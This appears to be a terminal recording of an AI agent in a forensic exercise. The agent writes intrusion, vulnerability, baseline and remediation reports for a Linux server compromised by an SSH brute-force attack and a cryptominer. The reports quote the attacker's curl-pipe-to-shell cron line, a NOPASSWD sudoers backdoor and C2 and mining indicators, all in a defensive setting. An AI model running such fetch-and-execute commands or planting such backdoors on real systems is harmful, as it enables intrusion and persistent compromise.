[270.783862, "i", "cat << 'EOF' > /app/gen_all.py\rimport os\r\rintrusion_report = '''# Post-Compromise Forensic Intrusion Report\r\r## Executive Summary\rHost `ssh-prod-01` (CentOS 7 Linux) suffered a multi-stage compromise initiated via external SSH root credential brute-forcing. The attacker successfully authenticated as `root`, deployed an XMRig Monero cryptominer, established multi-layered persistence across four distinct mechanisms (cron, systemd service, shell init, and a sudoers backdoor), cleared system authentication logs to evade detection, and conducted internal reconnaissance/pivoting via `hydra` against internal targets.\r\r## Attacker Entities and Indicators of Compromise (IoCs)\r- **Origin Attacker IP:** `198.51.100.78` (`/disk/var/log/secure:178`, `/sas/cti/advisory.txt`)\r- **C2 Beacon Domain:** `update-ssh.example.cn` (`/disk/var/lib/.cache/.wiped.bin`, `/sas/cti/advisory.txt`)\r- **Cryptomining Pool:** `stratum+tcp://xmr.ssh.evil:3333` (`/disk/tmp/.X11-unix/.xorg`, `/sas/cti/advisory.txt`)\r- **Monero Wallet Address:** `4A0000000000000000000d1ec67074f7` (`/disk/tmp/.X11-unix/.xorg`, `/sas/cti/advisory.txt`)\r- **Malware Process PID:** `1337` (`/disk/tmp/.X11-unix/.xorg`)\r- **Malware Binary Location:** `/tmp/.X11-unix/.xorg` (`/disk/tmp/.X11-unix/.xorg`, `/sas/alerts.json`)\r- **Malware Binary SHA256 Hash:** `52a70f2460b5bc530fc1a00627fcd72c43545a2bcb2bf5cfe2291b50a73d4253` (`/disk/tmp/.X11-unix/.xorg`)\r\r## Comprehensive Attack Chain Analysis\r\r### 1. Initial Access & Credential Access\rThe attacker initiated a high-frequency SSH password brute-force campaign against host `ssh-prod-01` targeting common accounts (`oracle`, `test`, `admin`, `postgres`, `root`) from source IP `198.51.100.78` (`/disk/var/log/secure:141`). At 2026-08-15 00:54:55 UTC, the attacker successfully authenticated as user `root` due to weak root credentials and permissive SSH baseline configurations (`/disk/var/log/secure:178`, `/disk/etc/ssh/sshd_config`).\r\r### 2. Execution & Impact (Cryptomining)\rUpon gaining root access, the attacker dropped and executed an XMRig cryptominer binary at `/tmp/.X11-unix/.xorg` (`/disk/tmp/.X11-unix/.xorg`). The process ran under PID 1337, connecting to Monero mining pool `stratum+tcp://xmr.ssh.evil:3333` using wallet `4A0000000000000000000d1ec67074f7` (`/disk/tmp/.X11-unix/.xorg`, `/sas/alerts.json`).\r\r### 3. Persistence Mechanisms (Alerted vs. Silent/Unalerted)\rThe attacker established four separate persistence mechanisms across the system:\r1. **Cron Persistence (Alerted CHK-11):** A cron entry in `/var/spool/cron/root` scheduled a recurring curl payload `curl hxxp://198.51.100.78/x | sh` to re-drop malware (`/disk/var/spool/cron/root:5`, `/sas/alerts.json`).\r2. **Systemd Service Persistence (Alerted CHK-13):** A malicious systemd unit file was placed at `/etc/systemd/system/system-update-helper.service` to auto-start a miner re-dropper on boot (`/disk/etc/systemd/system/system-update-helper.service`, `/sas/alerts.json`).\r3. **Shell Initialization Persistence (SILENT / Unalerted):** A `PROMPT_COMMAND` beacon pointing to `198.51.100.78` was injected into `/root/.bashrc` to execute whenever an interactive root shell is opened (`/disk/root/.bashrc:2`).\r4. **Privilege Escalation Sudo Backdoor (SILENT / Unalerted):** A drop-in sudoers file was created at `/etc/sudoers.d/devops` granting user `devops` unrestricted root privileges via `devops ALL=(ALL) NOPASSWD: ALL` (`/disk/etc/sudoers.d/devops:3`).\r\r### 4. Defense Evasion (Log Wiping)\rTo cover their tracks, the attacker wiped system authentication logs, creating an anti-forensic gap in `/var/log/secure` between 00:54:55 UTC and 01:29:12 UTC (`/disk/var/log/secure:178`). Residue of the wiping utility and domain C2 beacon were recovered from `/var/lib/.cache/.wiped.bin` (`/disk/var/lib/.cache/.wiped.bin`).\r\r### 5. Lateral Movement & Internal Pivoting\rFrom the compromised foothold, the attacker utilized the `devops` user account context to run `hydra` SSH brute-force attacks against internal network targets, as evidenced by shell history residue (`/disk/home/devops/.bash_history:6`).\r\r## "]
[270.784188, "i", "MITRE ATT&CK Technique Mapping\r\r| ATT&CK ID | Technique Name | Description | Evidence Citation | Alert Status |\r|---|---|---|---|---|\r| T1110 | Brute Force | Password brute-force attack on SSH root account | `/disk/var/log/secure:178` | Unalerted |\r| T1021.004 | SSH | Successful SSH remote access login | `/disk/var/log/secure:178` | Unalerted |\r| T1059.004 | Unix Shell | Execution of shell commands and scripts | `/disk/root/.bashrc:2` | Unalerted |\r| T1496 | Resource Hijacking | Monero cryptomining process and binary | `/disk/tmp/.X11-unix/.xorg` | Alerted (CHK-01/02) |\r| T1053.003 | Cron | Recurring scheduled re-dropper script | `/disk/var/spool/cron/root:5` | Alerted (CHK-11) |\r| T1546.004 | Unix Shell Config Modification | PROMPT_COMMAND beacon in `.bashrc` | `/disk/root/.bashrc:2` | Silent / Unalerted |\r| T1543.002 | Systemd Service | Malicious service `system-update-helper.service` | `/disk/etc/systemd/system/system-update-helper.service` | Alerted (CHK-13) |\r| T1070.002 | Clear Linux or Mac System Logs | Truncation and wiping of `/var/log/secure` | `/disk/var/lib/.cache/.wiped.bin` | Silent / Unalerted |\r| T1548.003 | Sudo and Sudo Caching | NOPASSWD sudoers backdoor for `devops` | `/disk/etc/sudoers.d/devops:3` | Silent / Unalerted |\r'''\r\rvuln_report = '''# Vulnerability-Driven Entry Analysis Report\r\r## Executive Summary\rA comprehensive analysis of vulnerability scan data (`/sas/vulns.json`), threat intelligence advisories (`/sas/cti/advisory.txt`), and forensic disk artifacts (`/disk`) was conducted to evaluate whether software vulnerabilities (CVEs) played any role in the initial compromise of `ssh-prod-01`.\r\r## Evaluation of Vulnerability Scan Results\rThe machine-readable vulnerability scan feed `/sas/vulns.json` contains an empty list (`[]`), indicating that no unpatched software vulnerabilities or active CVE exploits were identified or reported on host `ssh-prod-01` (`/sas/vulns.json`).\r\r## Evaluation of Draft Change Ticket Claims (BlueKeep CVE-2019-0708)\rThe initial draft change ticket CHG-3182 proposed patching `CVE-2019-0708` (BlueKeep) on RDP (`/sas/handoff/change-ticket.md`). \r\rThis proposal is **FALSE and INCORRECT**:\r1. Host `ssh-prod-01` is running CentOS 7 Linux (`/disk/etc/os-release`), whereas BlueKeep (CVE-2019-0708) is a Remote Desktop Protocol (RDP) vulnerability specific to Microsoft Windows operating systems (`/sas/cti/advisory.txt`).\r2. No RDP service or Windows subsystem exists on this Linux host (`/disk/etc/os-release`).\r\r## True Initial Entry Vector Identification\rInitial access was achieved purely through **credential exploitation** (SSH root password brute forcing) rather than software vulnerability exploitation:\r- Source IP `198.51.100.78` performed rapid password attempts against port 22 (`/disk/var/log/secure:141`).\r- Successful root login occurred at 2026-08-15 00:54:55 UTC via `Accepted password for root` (`/disk/var/log/secure:178`).\r- Threat intelligence advisory confirms the campaign relies on brute-force SSH logins (`/sas/cti/advisory.txt`).\r\r## Conclusion\r- **Software Vulnerability Exploited for Entry:** NONE (0 CVEs).\r- **Primary Root Cause:** Weak root password and non-hardened SSH service configurations.\r- **Confidence Level:** HIGH (`/disk/var/log/secure:178`, `/sas/cti/advisory.txt`, `/sas/vulns.json`).\r'''\r\rbaseline_report = '''# Security Baseline and Configuration Analysis Report\r\r## Executive Summary\rAnalysis of system configurations on `ssh-prod-01` revealed several severe security baseline deficiencies that directly facilitated the initial breach, enabled privilege escalation, and increased the host's overall attack surface.\r\r## Baseline Findings & Weaknesses\r\r### 1. Insecure SSH Configuration (BAS-01 / CHK-04)\r- **Artifact Path:** `/etc/ssh/sshd_config` (`/disk/etc/ssh/sshd_config`, `/sas/baseline.json`)\r- **Identified Weaknesses:**\r  - `PermitRootLogin yes`: Allows direct SSH logins as `root` from remote external hosts (`/disk/etc/ssh/sshd_config`).\r  - `PasswordAuthentication yes`: Permits password authentication instead of requiring SSH key-based authentication ("]
[270.78423, "i", "`/disk/etc/ssh/sshd_config`).\r  - `MaxAuthTries 6`: High authentication attempt threshold before disconnection, enabling rapid dictionary brute-forcing (`/disk/etc/ssh/sshd_config`).\r- **Security Risk:** Allowed the external attacker at `198.51.100.78` to brute-force the root user password directly over the network (`/disk/var/log/secure:178`).\r\r### 2. MySQL Remote Root Access and Public Binding (BAS-02 / CHK-09)\r- **Artifact Path:** `/etc/my.cnf` (`/disk/etc/my.cnf`, `/sas/baseline.json`)\r- **Identified Weaknesses:**\r  - `bind-address = 0.0.0.0`: Binds MySQL database service to all network interfaces (`/disk/etc/my.cnf`).\r  - Remote root grant enabled: Grants root database privileges over remote network connections (`/disk/etc/my.cnf`).\r- **Security Risk:** Exposes sensitive database management interface directly to the public/untrusted network.\r\r### 3. Weak Root Account Password Policy\r- **Artifact Path:** System authentication logs (`/disk/var/log/secure:178`)\r- **Identified Weaknesses:** Root account was secured by a weak password easily guessable via standard dictionary attack tools (`hydra`).\r- **Security Risk:** Enabled root account takeover within minutes of attack onset (`/disk/var/log/secure:141-178`).\r\r### 4. Excessive Privilege Delegation in Sudoers (Silent Backdoor Risk)\r- **Artifact Path:** `/etc/sudoers.d/devops` (`/disk/etc/sudoers.d/devops:3`)\r- **Identified Weaknesses:** Drop-in sudoers entry `devops ALL=(ALL) NOPASSWD: ALL` grants unrestricted root access without password prompt (`/disk/etc/sudoers.d/devops:3`).\r- **Security Risk:** Created a persistent backdoor allowing user `devops` to elevate to root seamlessly (`/disk/etc/sudoers.d/devops:3`).\r'''\r\rremediation_plan = '''# Comprehensive Post-Incident Remediation & Containment Plan\r\r## Executive Summary\rThis remediation plan outlines prioritized, step-by-step procedures to contain the active breach on `ssh-prod-01`, eradicate all persistence mechanisms, harden host baselines, and reconcile the draft change ticket CHG-3182. In accordance with forensic best practices, all actions prioritize backup and quarantine over destructive deletion.\r\r---\r\r## Reconciled Change Ticket CHG-3182\r\rBelow is the updated and corrected change ticket reconciled against forensic evidence in `/disk` and `/sas`:\r\r| # | Action | Target | Status | Note / Rationale & Evidence |\r|---|--------|--------|--------|-----------------------------|\r| 1 | Block source IP inbound | `198.51.100.78` | PROPOSED | **RECONCILED**: Corrected attacker IP from stale `203.0.113.9` to `198.51.100.78` (`/disk/var/log/secure:178`, `/sas/cti/advisory.txt`). |\r| 2 | Patch CVE-2019-0708 (BlueKeep) | RDP | REJECTED | **RECONCILED**: Rejected BlueKeep patch claim. Host is CentOS Linux; entry was SSH brute force (`/disk/etc/os-release`, `/sas/cti/advisory.txt`). |\r| 3 | Remove cron miner | `/var/spool/cron/root` | OPEN | **RECONCILED**: Downgraded from DONE to OPEN. Cron persistent beacon on line 5 requires quarantine and removal (`/disk/var/spool/cron/root:5`). |\r| 4 | Remove shell-init persistence | `/root/.bashrc` | TODO | **ADDED**: Quarantine and remove `PROMPT_COMMAND` beacon on line 2 (`/disk/root/.bashrc:2`). |\r| 5 | Remove systemd persistence | `/etc/systemd/system/system-update-helper.service` | TODO | **ADDED**: Disable, stop, and quarantine helper service (`/disk/etc/systemd/system/system-update-helper.service`). |\r| 6 | Remove sudoers backdoor | `/etc/sudoers.d/devops` | TODO | **ADDED**: Remove NOPASSWD ALL backdoor entry (`/disk/etc/sudoers.d/devops:3`). |\r| 7 | Kill miner process & quarantine binary | `/tmp/.X11-unix/.xorg` | TODO | **ADDED**: Terminate process PID 1337 and quarantine binary sample (`/disk/tmp/.X11-unix/.xorg`). |\r| 8 | Harden SSH configuration | `/etc/ssh/sshd_config` | TODO | **ADDED**: Set `PermitRootLogin no`, `PasswordAuthentication no`, require keys (`/disk/etc/ssh/sshd_config`). |\r| 9 | Harden MySQL configuration | `/etc/my.cnf` | TODO | **ADDED**: Set `bind-address = 127.0.0.1` and disable remote root (`/disk/etc/my.cnf`). |\r| 10 | Rotate root & user credentials | S"]
[270.78468, "i", "ystem Accounts | TODO | **ADDED**: Force password rotation across root and user accounts (`/disk/etc/passwd`). |\r\r---\r\r## Phase 1: Immediate Network Containment & Process Termination\r\r### Step 1.1: Block Attacker Infrastructure at Perimeter Firewall\r- **Action:** Add drop rules for attacker origin IP `198.51.100.78`, C2 domain `update-ssh.example.cn`, and pool domain `xmr.ssh.evil`.\r- **Evidence Citation:** `/disk/var/log/secure:178`, `/sas/cti/advisory.txt`\r- **Verification Command:** `iptables -L -n -v | grep 198.51.100.78`  \r\r### Step 1.2: Terminate Mining Process & Quarantine Binary\r- **Action:** Terminate active miner process (PID 1337) and move binary `/tmp/.X11-unix/.xorg` to quarantine directory `/var/quarantine/`.\r- **Evidence Citation:** `/disk/tmp/.X11-unix/.xorg`  \r- **Commands:**\r  ```bash\r  mkdir -p /var/quarantine\r  kill -9 1337\r  mv /tmp/.X11-unix/.xorg /var/quarantine/.xorg.bak\r  chmod 000 /var/quarantine/.xorg.bak\r  ```\r- **Verification Command:** `ps aux | grep .xorg`  \r\r---\r\r## Phase 2: Eradication of Persistence Mechanisms\r\r### Step 2.1: Eradicate Cron Persistence\r- **Action:** Backup `/var/spool/cron/root` to `/var/quarantine/cron_root.bak` and remove line 5 containing the malicious beacon.\r- **Evidence Citation:** `/disk/var/spool/cron/root:5`  \r- **Commands:**\r  ```bash\r  cp /var/spool/cron/root /var/quarantine/cron_root.bak\r  sed -i '/198.51.100.78/d' /var/spool/cron/root\r  ```\r- **Verification Command:** `crontab -l -u root | grep 198.51.100.78`  \r\r### Step 2.2: Eradicate Systemd Service Persistence\r- **Action:** Stop, disable, and relocate service file `/etc/systemd/system/system-update-helper.service`.\r- **Evidence Citation:** `/disk/etc/systemd/system/system-update-helper.service`  \r- **Commands:**\r  ```bash\r  systemctl stop system-update-helper.service\r  systemctl disable system-update-helper.service\r  mv /etc/systemd/system/system-update-helper.service /var/quarantine/\r  systemctl daemon-reload\r  ```\r- **Verification Command:** `systemctl status system-update-helper.service`  \r\r### Step 2.3: Eradicate Shell-Init Persistence (.bashrc)\r- **Action:** Backup `/root/.bashrc` and remove `PROMPT_COMMAND` beacon on line 2.\r- **Evidence Citation:** `/disk/root/.bashrc:2`  \r- **Commands:**\r  ```bash\r  cp /root/.bashrc /var/quarantine/.bashrc.bak\r  sed -i '/PROMPT_COMMAND/d' /root/.bashrc\r  ```\r- **Verification Command:** `grep PROMPT_COMMAND /root/.bashrc`  \r\r### Step 2.4: Eradicate Sudoers Backdoor\r- **Action:** Backup and remove `/etc/sudoers.d/devops`.\r- **Evidence Citation:** `/disk/etc/sudoers.d/devops:3`  \r- **Commands:**\r  ```bash\r  mv /etc/sudoers.d/devops /var/quarantine/devops_sudoers.bak\r  ```\r- **Verification Command:** `sudo -l -U devops`  \r\r---\r\r## Phase 3: System Hardening & Baseline Remediation\r\r### Step 3.1: Harden SSH Baseline\r- **Action:** Update `/etc/ssh/sshd_config` to disallow root password logins and enforce SSH key authentication.\r- **Evidence Citation:** `/disk/etc/ssh/sshd_config`  \r- **Configuration Updates:**\r  ```ini\r  PermitRootLogin no\r  PasswordAuthentication no\r  MaxAuthTries 3\r  ```\r- **Commands:**\r  ```bash\r  cp /etc/ssh/sshd_config /var/quarantine/sshd_config.bak\r  sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config\r  sed -i 's/^PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config\r  sed -i 's/^MaxAuthTries.*/MaxAuthTries 3/' /etc/ssh/sshd_config\r  systemctl reload sshd\r  ```\r- **Verification Command:** `sshd -T | grep -E \"permitrootlogin|passwordauthentication|maxauthtries\"`  \r\r### Step 3.2: Harden MySQL Baseline\r- **Action:** Restrict MySQL binding to local interface in `/etc/my.cnf` and revoke remote root grants.\r- **Evidence Citation:** `/disk/etc/my.cnf`  \r- **Configuration Updates:**\r  ```ini\r  bind-address = 127.0.0.1\r  ```\r- **Commands:**\r  ```bash\r  cp /etc/my.cnf /var/quarantine/my.cnf.bak\r  sed -i 's/bind-address = 0.0.0.0/bind-address = 127.0.0.1/' /etc/my.cnf\r  systemctl restart mysqld\r  ```\r- **Verification Command:** `netstat -tuln | grep 3306`  \r\r### Step 3.3: Rotate All Credentials\r- **Action:** Force immedi"]
[270.785447, "o", "cat << 'EOF' > /app/gen_all.py\r\n\u001b[?2004l\r\u001b[?2004h"]
[270.78546, "i", "ate password change for root and all user accounts.\r- **Evidence Citation:** `/disk/etc/passwd`, `/disk/var/log/secure:178`  \r- **Commands:**\r  ```bash\r  passwd -l root\r  passwd devops\r  ```\r\r---\r\r## Phase 4: Internal Target Investigation & Monitoring\r\r### Step 4.1: Internal Network Pivoting Scope Assessment\r- **Action:** Inspect internal hosts reachable from `ssh-prod-01` for potential hydra brute-force attempts originated by `devops`.\r- **Evidence Citation:** `/disk/home/devops/.bash_history:6`  \r- **Verification Command:** Review network connection logs and authentication logs across internal subnet nodes.\r'''\r\rwith open('/app/intrusion-report.md', 'w') as f:\r    f.write(intrusion_report)\r\rwith open('/app/vuln-report.md', 'w') as f:\r    f.write(vuln_report)\r\rwith open('/app/baseline-report.md', 'w') as f:\r    f.write(baseline_report)\r\rwith open('/app/remediation-plan.md', 'w') as f:\r    f.write(remediation_plan)\r\rprint(\"All 4 additional files written successfully!\")\rEOF\rpython3 /app/gen_all.py\r"]
[270.786432, "o", "> import os\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\r\n| ATT&CK I\u001b[?2004h> intrusion_report = '''# Post-Compromise Forensic Intrusion Report\r\n\u001b[?2004l\rption | Evidence Citation | Alert Statu\u001b[?2004h> \r\n\u001b[?2004l\rs\u001b[?2004h> ## Executive Summary\r\n\u001b[?2004l\r\u001b[?2004h> Host `ssh-prod-01` (CentOS 7 Linux) suffered a multi-stage compromise initiated via external SSH root credential brute-forcing. The attacker successfully authenticated as `root`, deployed an XMRig Monero cryptominer, established multi-layered persistence across four distinct mechanisms (cron, systemd service, shell init, and a sudoers backdoor), cleared system authentication logs to evade detection, and conducted internal reconnaissance/pivoting via `hydra` against internal targets.\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.786597, "o", "## Attacker Entities and Indicators of Compromise (IoCs)\r\n\u001b[?2004l\r\u001b[?2004h"]
[270.78669, "o", "> "]
[270.786897, "o", "- **Origin Attacker IP:** `198.51.100.78` (`/disk/var/log/secure:178`, `/sas/cti/advisory.txt`)\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.787175, "o", "- **C2 Beacon Domain:** `update-ssh.example.cn` (`/disk/var/lib/.cache/.wiped.bin`, `/sas/cti/advisory.txt`)\r\n\u001b[?2004l\r"]
[270.78732, "o", "\u001b[?2004h> "]
[270.78754, "o", "- **Cryptomining Pool:** `stratum+tcp://xmr.ssh.evil:3333` (`/disk/tmp/.X11-unix/.xorg`, `/sas/cti/advisory.txt`)\r\n\u001b[?2004l\r"]
[270.787602, "o", "\u001b[?2004h> "]
[270.787852, "o", "- **Monero Wallet Address:** `4A0000000000000000000d1ec67074f7` (`/disk/tmp/.X11-unix/.xorg`, `/sas/cti/advisory.txt`)\r\n\u001b[?2004l\r"]
[270.787949, "o", "\u001b[?2004h> "]
[270.788074, "o", "- **Malware Process PID:** `1337` (`/disk/tmp/.X11-unix/.xorg`)"]
[270.788124, "o", "\r\n"]
[270.788166, "o", "\u001b[?2004l\r"]
[270.788247, "o", "\u001b[?2004h> "]
[270.79023, "o", "- **Malware Binary Location:** `/tmp/.X11-unix/.xorg` (`/disk/tmp/.X11-unix/.xorg`, `/sas/alerts.json`)\r\n\u001b[?2004l\rreport = ''\u001b[?2004h> - **Malware Binary SHA256 Hash:** `52a70f2460b5bc530fc1a00627fcd72c43545a2bcb2bf5cfe2291b50a73d4253` (`/disk/tmp/.X11-unix/.xorg`)\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\rs\u001b[?2004h> ## Comprehensive Attack Chain Analysis\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r \u001b[?2004h> ### 1. Initial Access & Credential Access\r\n\u001b[?2004l\rdi\u001b[?2004h> The attacker initiated a high-frequency SSH password brute-force campaign against host `ssh-prod-01` targeting common accounts (`oracle`, `test`, `admin`, `postgres`, `root`) from source IP `198.51.100.78` (`/disk/var/log/secure:141`). At 2026-08-15 00:54:55 UTC, the attacker successfully authenticated as user `root` due to weak root credentials and permissive SSH baseline configurations (`/disk/var/log/secure:178`, `/disk/etc/ssh/sshd_config`).\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r \u001b[?2004h> ### 2. Execution & Impact (Cryptomining)\r\n\u001b[?2004l\rep C\u001b[?2004h> Upon gaining root access, the attacker dropped and executed an XMRig cryptominer binary at `/tmp/.X11-unix/.xorg` (`/disk/tmp/.X11-unix/.xorg`). The process ran under PID 1337, connecting to Monero mining pool `stratum+tcp://xmr.ssh.evil:3333` using wallet `4A0000000000000000000d1ec67074f7` (`/disk/tmp/.X11-unix/.xorg`, `/sas/alerts.json`).\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\rp\u001b[?2004h> ### 3. Persistence Mechanisms (Alerted vs. Silent/Unalerted)\r\n\u001b[?2004l\r/cti/advi\u001b[?2004h> The attacker established four separate persistence mechanisms across the system:\r\n\u001b[?2004l\r/d\u001b[?2004h> "]
[270.790463, "o", "1. **Cron Persistence (Alerted CHK-11):** A cron entry in `/var/spool/cron/root` scheduled a recurring curl payload `curl hxxp://198.51.100.78/x | sh` to re-drop malware (`/disk/var/spool/cron/root:5`, `/sas/alerts.json`).\r\n\u001b[?2004l\r"]
[270.790504, "o", "\u001b[?2004h> "]
[270.790877, "o", "2. **Systemd Service Persistence (Alerted CHK-13):** A malicious systemd unit file was placed at `/etc/systemd/system/system-update-helper.service` to auto-start a miner re-dropper on boot (`/disk/etc/systemd/system/system-update-helper.service`, `/sas/alerts.json`).\r\n\u001b[?2004l\r"]
[270.790919, "o", "\u001b[?2004h> "]
[270.791235, "o", "3. **Shell Initialization Persistence (SILENT / Unalerted):** A `PROMPT_COMMAND` beacon pointing to `198.51.100.78` was injected into `/root/.bashrc` to execute whenever an interactive root shell is opened (`/disk/root/.bashrc:2`).\r\n\u001b[?2004l\r"]
[270.791283, "o", "\u001b[?2004h> "]
[270.791611, "o", "4. **Privilege Escalation Sudo Backdoor (SILENT / Unalerted):** A drop-in sudoers file was created at `/etc/sudoers.d/devops` granting user `devops` unrestricted root privileges via `devops ALL=(ALL) NOPASSWD: ALL` (`/disk/etc/sudoers.d/devops:3`).\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.791651, "o", "\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.791705, "o", "### 4. Defense Evasion (Log Wiping)\r\n\u001b[?2004l\r"]
[270.791735, "o", "\u001b[?2004h> "]
[270.792189, "o", "To cover their tracks, the attacker wiped system authentication logs, creating an anti-forensic gap in `/var/log/secure` between 00:54:55 UTC and 01:29:12 UTC (`/disk/var/log/secure:178`). Residue of the wiping utility and domain C2 beacon were recovered from `/var/lib/.cache/.wiped.bin` (`/disk/var/lib/.cache/.wiped.bin`).\r\n\u001b[?2004l\r"]
[270.792243, "o", "\u001b[?2004h> \r\n\u001b[?2004l\rs"]
[270.792277, "o", "\u001b[?2004h> "]
[270.79235, "o", "### 5. Lateral Movement & Internal Pivoting\r\n\u001b[?2004l\rnesses"]
[270.792406, "o", "\u001b[?2004h> "]
[270.792766, "o", "From the compromised foothold, the attacker utilized the `devops` user account context to run `hydra` SSH brute-force attacks against internal network targets, as evidenced by shell history residue (`/disk/home/devops/.bash_history:6`).\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.792893, "o", "## MITRE ATT&CK Technique Mapping\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.79303, "o", "\r\n\u001b[?2004l\r"]
[270.793121, "o", "\u001b[?2004h> "]
[270.793293, "o", "| ATT&CK ID | Technique Name | Description | Evidence Citation | Alert Status |\r\n"]
[270.793326, "o", "\u001b[?2004l\r\u001b[?2004h"]
[270.793467, "o", "> |---|---|---|---|---|\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.793589, "o", "| T1110 | Brute Force | Password brute-force attack on SSH root account | `/disk/var/log/secure:178` | Unalerted |\r\n\u001b[?2004l\r"]
[270.793622, "o", "\u001b[?2004h"]
[270.793731, "o", "> "]
[270.793829, "o", "| T1021.004 | SSH | Successful SSH remote access login | `/disk/var/log/secure:178` | Unalerted |\r\n\u001b[?2004l\r"]
[270.793879, "o", "\u001b[?2004h> "]
[270.794077, "o", "| T1059.004 | Unix Shell | Execution of shell commands and scripts | `/disk/root/.bashrc:2` | Unalerted |\r\n\u001b[?2004l\r"]
[270.79413, "o", "\u001b[?2004h> "]
[270.794324, "o", "| T1496 | Resource Hijacking | Monero cryptomining process and binary | `/disk/tmp/.X11-unix/.xorg` | Alerted (CHK-01/02) |\r\n\u001b[?2004l\r"]
[270.794403, "o", "\u001b[?2004h> "]
[270.794587, "o", "| T1053.003 | Cron | Recurring scheduled re-dropper script | `/disk/var/spool/cron/root:5` | Alerted (CHK-11) |\r\n\u001b[?2004l\rrivil"]
[270.79462, "o", "\u001b[?2004h> "]
[270.794788, "o", "| T1546.004 | Unix Shell Config Modification | PROMPT_COMMAND beacon in `.bashrc` | `/disk/root/.bashrc:2` | Silent / Unalerted |\r\n\u001b[?2004l\rmanagement interface di"]
[270.794884, "o", "\u001b[?2004h> "]
[270.795046, "o", "| T1543.002 | Systemd Service | Malicious service `system-update-helper.service` | `/disk/etc/systemd/system/system-update-helper.service` | Alerted (CHK-13) |\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.79524, "o", "| T1070.002 | Clear Linux or Mac System Logs | Truncation and wiping of `/var/log/secure` | `/disk/var/lib/.cache/.wiped.bin` | Silent / Unalerted |\r\n\u001b[?2004l\ry"]
[270.795282, "o", "\u001b[?2004h> "]
[270.795487, "o", "| T1548.003 | Sudo and Sudo Caching | NOPASSWD sudoers backdoor for `devops` | `/disk/etc/sudoers.d/devops:3` | Silent / Unalerted |\r\n\u001b[?2004l\r\u001b[?2004h> '''\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.795585, "o", "vuln_report = '''# Vulnerability-Driven Entry Analysis Report\r\n\u001b[?2004l\r\u001b[?2004h"]
[270.795632, "o", "> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.795704, "o", "## Executive Summary\r\n\u001b[?2004l\r` "]
[270.795837, "o", "\u001b[?2004h> "]
[270.796141, "o", "A comprehensive analysis of vulnerability scan data (`/sas/vulns.json`), threat intelligence advisories (`/sas/cti/advisory.txt`), and forensic disk artifacts (`/disk`) was conducted to evaluate whether software vulnerabilities (CVEs) played any role in the initial compromise of `ssh-prod-01`.\r\n\u001b[?2004l\rvate to "]
[270.796186, "o", "\u001b[?2004h> \r\n\u001b[?2004l\rr"]
[270.796221, "o", "\u001b[?2004h> "]
[270.796382, "o", "## Evaluation of Vulnerability Scan Results\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.796737, "o", "The machine-readable vulnerability scan feed `/sas/vulns.json` contains an empty list (`[]`), indicating that no unpatched software vulnerabilities or active CVE exploits were identified or reported on host `ssh-prod-01` (`/sas/vulns.json`).\r\n\u001b[?2004l\r"]
[270.79679, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.796914, "o", "## Evaluation of Draft Change Ticket Claims (BlueKeep CVE-2019-0708)"]
[270.796954, "o", "\r\n\u001b[?2004l\r"]
[270.79698, "o", "\u001b[?2004h> "]
[270.797225, "o", "The initial draft change ticket CHG-3182 proposed patching `CVE-2019-0708` (BlueKeep) on RDP (`/sas/handoff/change-ticket.md`). \r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.79734, "o", "This proposal is **FALSE and INCORRECT**:\r\n\u001b[?2004l\riled Change Ti\u001b[?2004h> "]
[270.79763, "o", "1. Host `ssh-prod-01` is running CentOS 7 Linux (`/disk/etc/os-release`), whereas BlueKeep (CVE-2019-0708) is a Remote Desktop Protocol (RDP) vulnerability specific to Microsoft Windows operating systems (`/sas/cti/advisory.txt`).\r\n\u001b[?2004l\r\u001b[?2004h"]
[270.797682, "o", "> "]
[270.797843, "o", "2. No RDP service or Windows subsystem exists on this Linux host (`/disk/etc/os-release`).\r\n\u001b[?2004l\rECONCIL\u001b[?2004h> "]
[270.797877, "o", "\r\n"]
[270.797888, "o", "\u001b[?2004l\r\u001b[?2004h"]
[270.797932, "o", "> "]
[270.79803, "o", "## True Initial Entry Vector Identification\r\n\u001b[?2004l\r0\u001b[?2004h> "]
[270.798269, "o", "Initial access was achieved purely through **credential exploitation** (SSH root password brute forcing) rather than software vulnerability exploitation:\r\n\u001b[?2004l\r\u001b[?2004h"]
[270.798379, "o", "> "]
[270.798531, "o", "- Source IP `198.51.100.78` performed rapid password attempts against port 22 (`/disk/var/log/secure:141`).\r\n\u001b[?2004l\r\u001b[?2004h> "]
[270.798688, "o", "- Successful root login occurred at 2026-08-15 00:54:55 UTC via `Accepted password for root` (`/disk/var/log/secure:178`).\r\n\u001b[?2004l\r\u001b[?2004h"]
[270.798733, "o", "> "]
[270.798866, "o", "- Threat intelligence advisory confirms the campaign relies on brute-force SSH logins (`/sas/cti/advisory.txt`).\r\n\u001b[?2004l\r. |\r\n| 4 | "]
[270.798955, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ## Conclusion\r\n\u001b[?2004l\rmove shell-in"]
[270.799017, "o", "\u001b[?2004h> "]
[270.79911, "o", "- **Software Vulnerability Exploited for Entry:** NONE (0 CVEs).\r\n\u001b[?2004l\ra"]
[270.799141, "o", "\u001b[?2004h> "]
